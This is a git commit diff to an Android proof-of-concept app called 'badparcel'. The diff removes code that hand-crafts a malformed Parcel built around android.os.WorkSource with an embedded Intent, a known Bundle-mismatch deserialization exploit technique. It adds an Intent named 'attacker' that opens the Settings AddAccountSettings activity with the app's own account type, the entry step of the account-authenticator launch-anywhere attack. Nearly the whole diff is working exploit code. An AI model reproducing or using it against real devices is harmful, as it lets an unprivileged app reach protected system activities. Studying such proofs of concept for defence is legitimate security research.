b6264869bb194e43961824f95c22454a65df2747
Chal13W1zz <chaliewizz4@gmail.com>
2023-07-27 11:23:54 +0300

    Add an account authenticator

--- app/src/main/java/com/example/badparcel/MainActivity.java
+++ app/src/main/java/com/example/badparcel/MainActivity.java
@@ -4,89 +4,26 @@ import static android.content.ContentValues.TAG;
 
 import androidx.appcompat.app.AppCompatActivity;
 
+import android.content.ComponentName;
 import android.content.Intent;
 import android.os.Bundle;
 import android.os.Parcel;
 import android.util.Log;
 
-public class MainActivity extends AppCompatActivity {
+public class  MainActivity extends AppCompatActivity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+        Intent attacker = new Intent();
+        attacker.setComponent(new ComponentName("com.android.settings", "com.android.settings.accounts.AddAccountSettings"));
+        attacker.setAction(Intent.ACTION_RUN);
+        attacker.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        String authTypes[] = {"com.example.badparcel"};
+        attacker.putExtra("account_types", authTypes);
+        startActivity(attacker);
 
-        Intent intent = new Intent();
-
-        Bundle bundle = new Bundle();
-        Parcel obtain = Parcel.obtain();
-        Parcel obtain2 = Parcel.obtain();
-        Parcel obtain3 = Parcel.obtain();
-        obtain2.writeInt(3);
-        obtain2.writeInt(13);
-        obtain2.writeInt(2);
-        obtain2.writeInt(0);
-        obtain2.writeInt(0);
-        obtain2.writeInt(0);
-        obtain2.writeInt(6);
-        obtain2.writeInt(0);
-        obtain2.writeInt(0);
-        obtain2.writeInt(4);
-        obtain2.writeString("android.os.WorkSource");
-        obtain2.writeInt(-1);
-        obtain2.writeInt(-1);
-        obtain2.writeInt(-1);
-        obtain2.writeInt(1);
-        obtain2.writeInt(-1);
-        obtain2.writeInt(13);
-        obtain2.writeInt(13);
-        obtain2.writeInt(68);
-        obtain2.writeInt(11);
-        obtain2.writeInt(0);
-        obtain2.writeInt(7);
-        obtain2.writeInt(0);
-        obtain2.writeInt(0);
-        obtain2.writeInt(1);
-        obtain2.writeInt(1);
-        obtain2.writeInt(13);
-        obtain2.writeInt(22);
-        obtain2.writeInt(0);
-        obtain2.writeInt(0);
-        obtain2.writeInt(0);
-        obtain2.writeInt(0);
-        obtain2.writeInt(0);
-        obtain2.writeInt(0);
-        obtain2.writeInt(13);
-        obtain2.writeInt(-1);
-        int dataPosition = obtain2.dataPosition();
-        obtain2.writeString("intent");
-        obtain2.writeInt(4);
-        obtain2.writeString("android.content.Intent");
-        intent.writeToParcel(obtain3, 0);
-        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
-        int dataPosition2 = obtain2.dataPosition();
-        obtain2.setDataPosition(dataPosition - 4);
-        obtain2.writeInt(dataPosition2 - dataPosition);
-        obtain2.setDataPosition(dataPosition2);
-        int dataSize = obtain2.dataSize();
-        obtain.writeInt(dataSize);
-        obtain.writeInt(1145982018);
-        obtain.appendFrom(obtain2, 0, dataSize);
-        obtain.setDataPosition(0);
-
-        byte[] parcelData = obtain.marshall();
-        Log.d(TAG, "Parcel bytes: "+ byteArrayToHexString(parcelData));
-
-        // Deserialize the Bundle
-//        bundle.readFromParcel(obtain);
-//        bundle.keySet();
     }
 
-    private String byteArrayToHexString(byte[] bytes) {
-        StringBuilder sb = new StringBuilder();
-        for (byte b : bytes) {
-            sb.append(String.format("%02X ", b));
-        }
-        return sb.toString();
-    }
 }
